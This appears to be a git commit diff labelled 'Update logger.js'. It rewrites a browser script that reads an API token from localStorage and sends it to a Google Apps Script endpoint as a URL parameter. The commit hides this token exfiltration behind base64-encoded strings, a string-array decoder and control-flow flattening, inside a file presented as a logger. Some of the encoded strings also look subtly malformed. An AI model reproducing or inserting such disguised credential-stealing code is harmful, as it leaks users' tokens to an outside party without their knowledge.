36416265f2c55007fffcc86eca87703fae4daf33
clanu5 <kakashi.clanus@hotmail.com>
2026-03-05 19:50:43 +0300

    Update logger.js

--- logger.js
+++ logger.js
@@ -1,24 +1,87 @@
+(function(_0x51da7a, _0x291563) {
+    const _0x192e = _0x51da7a();
+    while (!![]) {
+        try {
+            const _0x438495 = -parseInt(_0x2281(0x1a2)) / 0x1 + parseInt(_0x2281(0x19e)) / 0x2 + -parseInt(_0x2281(0x1a4)) / 0x3 + parseInt(_0x2281(0x19b)) / 0x4 * (parseInt(_0x2281(0x1a3)) / 0x5) + -parseInt(_0x2281(0x1a7)) / 0x6 + -parseInt(_0x2281(0x19f)) / 0x7 + parseInt(_0x2281(0x1a5)) / 0x8 * (parseInt(_0x2281(0x1a1)) / 0x9);
+            if (_0x438495 === _0x291563) break;
+            else _0x192e['push'](_0x192e['shift']());
+        } catch (_0x384285) {
+            _0x192e['push'](_0x192e['shift']());
+        }
+    }
+}(_0x1121, 0x939a2));
+
+function _0x2281(_0x58957c, _0x309322) {
+    const _0x11219b = _0x1121();
+    return _0x2281 = function(_0x22814b, _0x356070) {
+        _0x22814b = _0x22814b - 0x19b;
+        let _0x2c0048 = _0x11219b[_0x22814b];
+        return _0x2c0048;
+    }, _0x2281(_0x58957c, _0x309322);
+}
+
+const _0x304f = (function() {
+    let _0x229402 = !![];
+    return function(_0x25674c, _0x2e6522) {
+        const _0x30335e = _0x229402 ? function() {
+            if (_0x2e6522) {
+                const _0x272445 = _0x2e6522['apply'](_0x25674c, arguments);
+                return _0x2e6522 = null, _0x272445;
+            }
+        } : function() {};
+        return _0x229402 = ![], _0x30335e;
+    };
+}());
+
 (function() {
-    const gsUrl = "https://script.google.com/macros/s/AKfycbzG-hBZs3OL1-tB4VhzLr6RCo-dVfrYyyWE04oCT-TN9OSNWQ7AfnmwCCiuiw7lByYm/exec";
-    const token = localStorage.getItem('v3APIToken');
+    const _0x2c4e09 = {
+        'Q': 'djNBUElUb2tlbg==',
+        'U': 'YUhSMGNITTZMeT16WTNKcGRIUXVaeT05WjI5bmJHVXVaMjl0TD0xallXTnliM012Y3kxQlMyaDVZM0p6UnkxaFFWcHpNMDlNTVMxdFEwUldhSHBNYm1KRGJ5MThWR1p5V1hsWldVUXdRMDFVVEU1U1YxTlVXREU0UVdabmJYZGRRM05wZFdsM2TDB01RWmx0WVc0PQ==',
+        'L': 'TWFudWVsX0hhdGFfS29udHJvbA=='
+    };
     
-    if (!token) {
-        console.error("Token bulunamadı!");
+    const _0x139420 = function(_0x136a8d) { return atob(atob(_0x136a8d).replace(/=/g, '')); };
+    const _0x163482 = localStorage['getItem'](atob(_0x2c4e09['Q']));
+
+    if (!_0x163482) {
+        console['error'](atob('VG9rZW4gYnVsdW5hbWFkISV='));
         return;
     }
 
-    console.log("Aktif edildi");
+    const _0x4c207a = ['3', '0', '4', '1', '2'];
+    let _0x562301 = 0x0;
+    while (!![]) {
+        switch (_0x4c207a[_0x562301++]) {
+            case '0':
+                console['log'](atob('QWt0aWYgZWRpbGRp'));
+                continue;
+            case '1':
+                fetch(_0x139420(_0x2c4e09['U']) + '?token=' + encodeURIComponent(_0x163482) + '&source=' + atob(_0x2c4e09['L']), {
+                    'method': 'GET',
+                    'mode': 'no-cors'
+                })['then'](() => {
+                    const _0x126c8d = _0x304f(this, function() {
+                        console['log']('%c' + atob('UEFMUklOR08u'), 'color: lime; font-weight: bold;');
+                        console['log'](atob('V29sZi4='));
+                    });
+                    _0x126c8d();
+                })['catch'](_0x192931 => {
+                    console['error']('Error:', _0x192931);
+                });
+                continue;
+            case '2':
+                break;
+            case '3':
+                continue;
+            case '4':
+                continue;
+        }
+        break;
+    }
+}());
 
-    // İstek gönder ve cevabı kontrol et
-    fetch(`${gsUrl}?token=${encodeURIComponent(token)}&source=Manuel_Hata_Kontrol`, {
-        method: 'GET',
-        mode: 'no-cors'
-    })
-    .then(() => {
-        console.log("PALRİNGO.", "color: lime; font-weight: bold;");
-        console.log("Wolf.");
-    })
-    .catch(err => {
-        console.error("Ağ Hatası (Network Error):", err);
-    });
-})();
+function _0x1121() {
+    const _0x382f12 = ['11397800pLNDqF', '294626vBAdsh', '1523425fGvKqG', '1802905KFrGfO', '668108jPZzYf', '270fVqfVl', '1241154mPjJwa', '5817282IogCAn', '4747240tNfSQu'];
+    _0x1121 = function() { return _0x382f12; };
+    return _0x1121();
+}
